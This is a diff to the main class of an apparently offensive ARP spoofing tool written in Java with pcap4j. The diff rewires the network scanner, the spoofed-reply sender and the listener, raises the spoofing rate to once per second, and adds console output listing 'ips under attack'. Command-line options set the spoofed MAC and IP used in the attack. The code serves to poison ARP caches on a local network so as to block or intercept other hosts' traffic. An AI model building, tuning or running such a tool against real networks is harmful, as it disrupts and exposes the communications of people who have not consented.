@@ -99,6 +99,7 @@ public class Main implements Runnable {
                         .map(String::trim)
                         .map(this::convertToIp)
                         .forEach(ignoreIps::add);
+                System.out.println("length of ips to ignore  is  +++++" + ignoreIps.size());
             }
 
             if (cmd.hasOption("sip")) {
@@ -124,14 +125,15 @@ public class Main implements Runnable {
             sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
             receiveHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
 
-            spoofArpReply = new SpoofArpReply(sendHandle,spoofMacAddress,spoofInetAddress);
-            arpScan = new ArpScanNetwork(sendHandle, network, ipMaps, spoofInetAddress, spoofMacAddress);
-            listner = new ReplyListener(receiveHandle, ignoreIps, ipMaps,spoofArpReply);
-            arpSpoofSender = new ArpSpoofSender(ipMaps, addressToBlock, spoofMacAddress, sendHandle);
+            // working settings
+            spoofArpReply = new SpoofArpReply(sendHandle, spoofMacAddress, spoofInetAddress);
+            arpScan = new ArpScanNetwork(sendHandle, network, machineAddress, machineMacAddress);
+            listner = new ReplyListener(receiveHandle, ignoreIps, ipMaps, spoofArpReply, spoofInetAddress);
+            arpSpoofSender = new ArpSpoofSender(ipMaps, addressToBlock, machineMacAddress, sendHandle);
 
             ScheduledExecutorService scheduledExecutor = Executors.newScheduledThreadPool(2);
             scheduledExecutor.scheduleAtFixedRate(arpScan, 2L, 120L, TimeUnit.SECONDS);
-            scheduledExecutor.scheduleAtFixedRate(arpSpoofSender, 2L, 2L, TimeUnit.SECONDS);
+            scheduledExecutor.scheduleAtFixedRate(arpSpoofSender, 2L, 1L, TimeUnit.SECONDS);
 
             ExecutorService executorService = Executors.newSingleThreadExecutor();
             executorService.execute(listner);
@@ -140,16 +142,28 @@ public class Main implements Runnable {
                 System.out.println("press 'p' to print ips under attack or 'q' to quit");
                 String input = scanner.nextLine().trim();
                 if (input.equals("p")) {
+                    System.out.println(" ips under attack");
                     ipMaps.entrySet()
-                            .stream()
                             .forEach(entry -> System.out.println(entry.getKey() + "  :  " + entry.getValue()));
+                    System.out.println("-------------------------------------------");
+                    System.out.println("ips not under attack");
+                    ignoreIps.forEach(System.out::println);
                 } else if (input.equals("q")) {
+
                     scheduledExecutor.shutdownNow();
                     System.out.println("attack down");
                     executorService.shutdownNow();
                     System.out.println("listeners down");
-                    sendHandle.close();
-                    receiveHandle.close();
+                    listner.close();
+                    System.out.println("shutting down handles");
+                    while (true) {
+                        if (scheduledExecutor.isTerminated() && executorService.isTerminated()) {
+                            sendHandle.close();
+                            receiveHandle.close();
+                            break;
+                        }
+                    }
+
                     System.out.println("interface handles down");
                     return;
                 } else {
@@ -171,7 +185,7 @@ public class Main implements Runnable {
         options.addOption("a", "ips to exclude exclude from the attack, separate by ','");
         options.addOption("h", "help me");
         options.addOption("myip", true, "Machine Ip address");
-        options.addOption("smac ", true, "spoof mac. Used to scan network and usd in attack");
+        options.addOption("smac", true, "spoof mac. Used to scan network and usd in attack");
         options.addOption("sip", true, "spoof ip. Used to scan the network");
     }
 
